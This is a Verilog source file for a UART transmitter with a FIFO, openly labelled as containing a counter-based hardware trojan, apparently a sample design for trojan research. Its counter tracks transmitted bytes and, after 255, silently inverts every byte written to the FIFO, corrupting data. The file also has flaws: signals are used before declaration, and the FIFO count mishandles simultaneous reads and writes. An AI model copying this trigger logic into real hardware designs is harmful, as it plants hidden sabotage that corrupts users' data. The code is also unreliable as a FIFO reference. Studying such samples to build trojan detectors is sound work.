 // Modified UART TX Module with FIFO and Counter-Based Hardware Trojan
module uart_tx_fifo_trojan_v9 (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    reg [7:0] mem [0:31]; // FIFO memory
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0; // Write and read pointers
    reg [4:0] cnt = 5'd0; // Count of bytes in FIFO
    reg we = 1'b0; // Write enable for internal UART TX
    reg [7:0] data = 8'd0; // Data to be sent

    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Counter-Based Trojan Activation
    reg [15:0] transmission_counter = 16'd0; // Count transmitted bytes
    always @(posedge clk) begin
        if (we) transmission_counter <= transmission_counter + 1'b1;
    end
    wire trojan_trigger = (transmission_counter >= 16'h00FF); // Specific trigger condition based on transmitted byte count

    // Trojan: Inverts the data to be transmitted when the trigger condition is met
    always @(posedge clk) begin
        if (write) begin
            w_addr <= w_addr + 5'd1;
            cnt <= cnt + 5'd1;
            if (trojan_trigger) begin
                mem[w_addr] <= ~rx_data; // Invert data if trojan is triggered
            end else begin
                mem[w_addr] <= rx_data;
            end
        end

        if (read) begin
            r_addr <= r_addr + 5'd1;
            cnt <= cnt - 5'd1;
            we <= 1'b1;
            data <= mem[r_addr];
        end else begin
            we <= 1'b0;
        end
    end

    assign write = rx_we && (cnt < 5'd31);
    assign read = ~uart_busy && (cnt > 5'd0) && ~we;

    // Managing the busy flag
    always @(posedge clk) begin
        tx_busy <= uart_busy || (cnt != 5'd0);
    end

endmodule
